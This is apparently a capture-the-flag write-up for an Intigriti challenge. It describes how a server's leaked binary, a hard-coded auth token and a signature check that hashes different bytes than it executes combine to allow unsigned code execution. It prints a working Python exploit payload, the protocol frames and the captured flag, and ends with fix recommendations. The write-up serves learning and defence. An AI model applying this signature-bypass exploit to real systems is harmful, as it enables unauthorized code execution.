# Improper signature verification in POST /custom_protocol allows arbitrary code execution

- **Source URL:** https://medium.com/@0xmust4fa/improper-signature-verification-in-post-custom-protocol-allows-arbitrary-code-execution-22fc88e51f85
- **Fetched from:** https://medium.com/@0xmust4fa/improper-signature-verification-in-post-custom-protocol-allows-arbitrary-code-execution-22fc88e51f85?source=rss-e1885e1907c2------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14998 (id 14998)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** M. Mustafa Hussaini / Tue, 24 Nov 2026 05:24:11 GMT

*Super Fast Server 2.0.0 — Intigriti Challenge 1126*

**Component:** \`POST /custom\_protocol\` (HTTP → protocol bridge) → \`EXEC\` handler

**Severity:** Medium (program rule; CVSS 4.0 would rate it 9.3 Critical)

**Flag:** \`INTIGRITI{4c0532a9-f169–4a5d-ae02-a8b0671d2b07}\`

\`POST /custom\_protocol\` forwards the raw request body to an internal protocol server that only executes RSA-signed code. \`HELP\` hands out a *\*validly signed\** payload, and the verifier hashes a different byte range than the one that gets executed — so we reuse the author’s own signature to run our code.

**## Step 1 — The file server leaks its own binary**

Directories are listed from the real filesystem root, but files are opened as \`fopen(basename(path), “rb”)\` from the CWD (\`/app\`). So \`/src/\`, \`/proc/\`, \`/run/\` list, and the server binary downloads:

\`\`\`

GET /superfastserver → 200, ELF x86–64

**## Step 2 — The binary contains everything**

Strings give the endpoint \`/custom\_protocol\` (bridge to \`127.0.0.1:5001\`), the 106-byte \`AUTH\` token, the RSA-2048 modulus with \`e = 65537\`, and the \`/the\_real.flag\` path. Frame format: \`’w’ | u32 len | 4-byte tag | payload\`.

AUTH \<secret> → ACK

CODE \<x86 code> → ACK stores CODE\_off / CODE\_len, mmap RWX → RX

DATA \<bf program> → ACK stores DATA\_off / DATA\_len

PING \<anything> → PONG stores nothing

SIGN \<signature> → ACK stores SIGN\_off / SIGN\_len

EXEC → verifies the signature, then runs the code

**## Step 3 — Get a signed payload for free**

AUTH secret + HELP → CODE(396) + DATA(424) + SIGN(256) + EXEC

Replaying it prints *\*”I hope you like this so far. Keep going!”\**. The signature is genuine: \`pow(sig, e, N)\` is PKCS#1 v1.5 over \`sha256(code ‖ prog)\`.

**## Step 4 — Break the binding between “signed” and “executed”**

\`EXEC\` computes \`sha256(stream + CODE\_off, CODE\_len + DATA\_len)\` but starts the interpreter at \`DATA\_off\`, running until a NUL byte. Offsets and lengths are attacker-controlled, and \`PING\` contributes no length:

CODE = code‖prog → hash window = exactly the 820 signed bytes

DATA = (empty) → DATA\_off = 820, adds 0 to the window

PING = our program → executed from 820, never hashed

SIGN = original sig → verifies

EXEC → runs our Brainfuck

**## Step 5 — Read the flag**

Every connection pre-loads \`/the\_real.flag\` (81 B) at \`fs:0–0x60\`; the interpreter’s tape

starts at \`fs:0–0x160\` and the pointer is unbounded:

\`\`\`brainfuck

\>\*256 .>\*80 . ; 256 steps up → flag, print 81 bytes

**## Payload**

\`\`\`python

SECRET = b”SUPER\_SECRET\_CHALLENGE\_AUTH\_CODE\_THAT\_CANT\_BE\_BRUTE\_FORCED\_1337\_” \

b”INTIGRITI\_341465b5b427f6e7c2125b300a74a033"

msg = lambda t, p: b”w” + len(p).to\_bytes(4, “little”) + t + p

code, prog, sig = help\_blob() # from the HELP frame: 396 + 424 + 256 bytes

body = (SECRET

\+ msg(b”CODE”, code + prog) # 820 B, signed

\+ msg(b”DATA”, b””) # pins DATA\_off

\+ msg(b”PING”, b”>”\*256 + b”.>”\*80 + b”.” + b”\x00") # our program

\+ msg(b”SIGN”, sig)

\+ msg(b”EXEC”, b””))

\# POST [https://challenge-1126.challenges.intigriti.io/custom\_protocol](https://challenge-1126.challenges.intigriti.io/custom_protocol)

\# Content-Type: application/octet-stream

ACK ACK ACK PONG ACK

INTIGRITI{4c0532a9-f169–4a5d-ae02-a8b0671d2b07}

**## Why it works**

The signature is real and the RSA code is correct — the bug is that the *\*verified\** range (\`CODE\_len + DATA\_len\` from \`CODE\_off\`) and the *\*executed\** range (\`DATA\_off\` until NUL) are derived independently. An empty \`DATA\` frame plus \`PING\` frames therefore let unsigned bytes run under a signed digest.

**\*\*Bug type:\*\*** Code Injection (CWE-94) · root cause: signature does not cover the executed bytes (CWE-347/436) · prerequisites: CWE-552 (exposed files), CWE-798 (hard-coded credentials in the served binary).

**## Fix**

1\. **\*\*Path handling:\*\*** resolve with \`realpath()\` and reject anything outside the document root; use the same resolved path for files and directories.

2\. **\*\*Serving policy:\*\*** allow-list static assets; never serve the binary, sources or \`run/secrets\`.

3\. **\*\*Secrets:\*\*** no \`AUTH\` token or key material in a distributed binary.

4\. **\*\*Bind signature to execution:\*\*** verify over exactly the bytes executed (\`sha256(payload)\` → run \`payload\[0..len\]\`), sign the frame lengths, add a per-session nonce, reject zero-length/out-of-order frames.

5\. **\*\*Contain execution:\*\*** sandboxed child (\`seccomp\`, no FS/network), W^X instead of \`mmap(RWX)\` on attacker data.
